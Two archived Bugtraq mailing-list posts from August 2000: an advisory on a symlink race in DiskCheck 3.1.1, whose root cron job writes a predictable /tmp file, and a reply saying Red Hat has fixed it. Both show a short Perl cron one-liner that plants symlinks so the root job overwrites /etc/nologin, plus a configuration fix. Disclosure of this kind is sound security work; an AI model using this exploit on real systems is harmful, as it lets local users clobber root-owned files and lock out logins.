=== Content from seclists.org_3d9e1806_20250125_171057.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](95)
[By Date](date.html#96)
[![Next](/images/right-icon-16x16.png)](97)

[![Previous](/images/left-icon-16x16.png)](82)
[By Thread](index.html#96)
[![Next](/images/right-icon-16x16.png)](87)

![](/shared/images/nst-icons.svg#search)

# Re: Diskcheck 3.1.1 Symlink Vulnerability

---

*From*: Stan Bubrouski <secnet () CROSSWINDS NET>

*Date*: Mon, 7 Aug 2000 11:41:49 -0400

---

```

At 05:36 PM 8/5/00 +0900, You, Jin-Ho wrote:

```
> ```
>
> Diskcheck 3.1.1 Symlink Vulnerability
>
> 1 Introduction
>
> DiskCheck is a Perl script that monitors how much space is available
> on your hard drive.  Basically, it checks your drive space every
> hour and takes action based on the specifications in the config file
> /etc/diskcheck.conf.
>
> DiskCheck 3.1.1 is available from
> <http://www.kaybee.org/~kirk/html/linux.html> and
> RedHat Powertools 6.x.
>
> 2 Vulnerability
>
> The command, /etc/cron.hourly/diskcheck.pl is executed with root
> privilege
> every hour. It creates a temporary file, whose default name is
> /tmp/diskusagealert.txt.<pid> defined in /etc/diskcheck.conf,
> is predictable and is willing to follow symbolic links.  This may allow
> malicious local users to create or overwrite arbitrarily named files.
> 3 Exploit
>
> The following cron job creates the file, /etc/nologin.
>
> 0 * * * * perl -e 'foreach $i (1..200) { $pid = $$ + $i; \
>    symlink("/etc/nologin", "/tmp/diskusagealert.txt.$pid"); }'
>
> 4 Solution
>
> Relocate the temporary file into the directory where root only can
> create
> a file.
>
> Example)
>
> Edit /etc/diskcheck.conf
>
>  $tempfile = '/var/local/diskusagealert.txt'
>
> # ls -ld /var/local
> drwxr-xr-x   2 root     root         1024 Feb  7  1996 /var/local/
>
>
> You, Jin-Ho, jhyou () chonnam ac kr
>
> ```

```

This was reported on the list about a month ago and is fixed in Red Hat's
current rawhide,
and in Red Hat Pinstripe (7.0 beta).  I don't know of any other distros
that include it.

-Stan Bubrouski

```

---

[![Previous](/images/left-icon-16x16.png)](95)
[By Date](date.html#96)
[![Next](/images/right-icon-16x16.png)](97)

[![Previous](/images/left-icon-16x16.png)](82)
[By Thread](index.html#96)
[![Next](/images/right-icon-16x16.png)](87)

### Current thread:

* [Diskcheck 3.1.1 Symlink Vulnerability](82) *You, Jin-Ho (Aug 07)*
  + **Re: Diskcheck 3.1.1 Symlink Vulnerability** *Stan Bubrouski (Aug 07)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_325842a1_20250125_171056.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](81)
[By Date](date.html#82)
[![Next](/images/right-icon-16x16.png)](83)

[![Previous](/images/left-icon-16x16.png)](148)
[By Thread](index.html#82)
[![Next](/images/right-icon-16x16.png)](96)

![](/shared/images/nst-icons.svg#search)

# Diskcheck 3.1.1 Symlink Vulnerability

---

*From*: "You, Jin-Ho" <jhyou () CHONNAM CHONNAM AC KR>

*Date*: Sat, 5 Aug 2000 17:36:13 +0900

---

```
Diskcheck 3.1.1 Symlink Vulnerability

1 Introduction

DiskCheck is a Perl script that monitors how much space is available
on your hard drive.  Basically, it checks your drive space every
hour and takes action based on the specifications in the config file
/etc/diskcheck.conf.

DiskCheck 3.1.1 is available from
<http://www.kaybee.org/~kirk/html/linux.html> and
RedHat Powertools 6.x.

2 Vulnerability

The command, /etc/cron.hourly/diskcheck.pl is executed with root
privilege
every hour. It creates a temporary file, whose default name is
/tmp/diskusagealert.txt.<pid> defined in /etc/diskcheck.conf,
is predictable and is willing to follow symbolic links.  This may allow
malicious local users to create or overwrite arbitrarily named files.
3 Exploit

The following cron job creates the file, /etc/nologin.

0 * * * * perl -e 'foreach $i (1..200) { $pid = $$ + $i; \
   symlink("/etc/nologin", "/tmp/diskusagealert.txt.$pid"); }'

4 Solution

Relocate the temporary file into the directory where root only can
create
a file.

Example)

Edit /etc/diskcheck.conf

 $tempfile = '/var/local/diskusagealert.txt'

# ls -ld /var/local
drwxr-xr-x   2 root     root         1024 Feb  7  1996 /var/local/

You, Jin-Ho, jhyou () chonnam ac kr

```

---

[![Previous](/images/left-icon-16x16.png)](81)
[By Date](date.html#82)
[![Next](/images/right-icon-16x16.png)](83)

[![Previous](/images/left-icon-16x16.png)](148)
[By Thread](index.html#82)
[![Next](/images/right-icon-16x16.png)](96)

### Current thread:

* **Diskcheck 3.1.1 Symlink Vulnerability** *You, Jin-Ho (Aug 07)*
  + [Re: Diskcheck 3.1.1 Symlink Vulnerability](96) *Stan Bubrouski (Aug 07)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


